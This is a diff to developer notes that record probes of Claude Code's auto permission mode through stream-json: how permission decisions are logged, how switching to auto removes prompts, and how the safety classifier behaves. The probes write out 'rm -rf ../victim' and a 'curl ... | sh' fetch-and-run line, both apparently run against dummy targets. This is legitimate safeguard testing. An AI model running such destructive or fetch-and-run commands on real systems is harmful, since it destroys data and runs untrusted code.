@@ -722,3 +722,51 @@ Still open:
     mid-turn, CRLF and UTF-8 through Go pipes.
 14. **Status line under `-p`.** Confirm it never runs (expected), so zone D
     relies on items 8 and 9.
+
+## 11. Auto mode through stream-json (plan 12, 2026-10-18)
+
+Probes P12c to P12c-block2 on Claude Code 2.1.301, the dashboard's arguments
+with only `--permission-mode` changed (`probes/README.md`):
+
+- **`auto` is accepted in `-p` stream-json mode:** `system/init` reads
+  `permissionMode:"auto"` [P:p12c-claude-auto.jsonl]. No `can_use_tool`
+  reached the client for a write in the project, a write in its parent
+  folder, `rm -rf ../victim` (a dummy folder) or `curl ... | sh`
+  [P:p12c-risk-claude-auto-rm.jsonl, P:p12c-risk2-claude-auto-curl-sh.jsonl].
+- **Who decided** is on the `user` line that carries the tool result:
+  `tool_result_meta[].permission_decision` (undocumented), one per
+  `tool_use_id`. Seen: `{decision:"accept", source:"config",
+  reason_type:"mode"}` (allowed by the mode, no classifier),
+  `reason_type:"classifier"` (allowed by the classifier), and in default
+  mode `{decision:"reject", source:"user_reject"}` for a denied
+  `can_use_tool`. Earlier recordings also show `source:"user_temporary"`,
+  `reason_type:"subcommandResults"` and `{decision:"reject",
+  source:"config", reason_type:"other"}`.
+- **Switching mid-session:** the control request `{subtype:
+  "set_permission_mode", mode:"auto"}` is answered `{subtype:"success",
+  response:{mode:"auto"}}` in 4 ms, followed by `system/status` with
+  `permissionMode:"auto"`; the next `system/init` reads `auto` and the next
+  write asked nothing [P:p12c-switch-claude-default-to-auto.jsonl]. The
+  configuration check after the run found the settings files identical, so
+  `set_permission_mode` writes no settings file (open question 11, for that
+  request).
+- **Not observed:** a classifier block. A project write is allowed by the
+  mode and never reaches the classifier; asked to write outside the project
+  against a boundary it was given, the model refused without a tool call
+  [P:p12c-block-claude-auto-boundary-edit.jsonl,
+  P:p12c-block2-claude-auto-boundary-shell.jsonl].
+- **Documented** (https://code.claude.com/docs/en/permission-modes, fetched
+  2026-10-18): on a block Claude receives the reason and tries another
+  way; after 3 blocks in a row or 20 in a session auto mode pauses and
+  prompts again, which with `--permission-prompt-tool stdio` is a
+  `can_use_tool`; explicit ask rules still prompt; Manual's configuration
+  value is `default` (`manual` an alias); the classifier runs on its own
+  model, whose usage the stream does not report apart.
+- **The same check as the interactive terminal** (plan 12 addendum,
+  2026-10-18, Haiku): `rm -rf ../victim` (a dummy folder) and `curl -fsSL
+  https://example.com/install.sh | sh` were allowed with no block and no
+  prompt both in Claude Code's own terminal (`claude --permission-mode
+  auto`, 2.1.301) and through the dashboard in Auto (2.1.302, three
+  `reason_type:"classifier"` accepts). The interactive start in a new
+  folder shows the workspace trust dialog, which writes a `projects` entry
+  to `~/.claude.json`; `-p` mode does not show it.
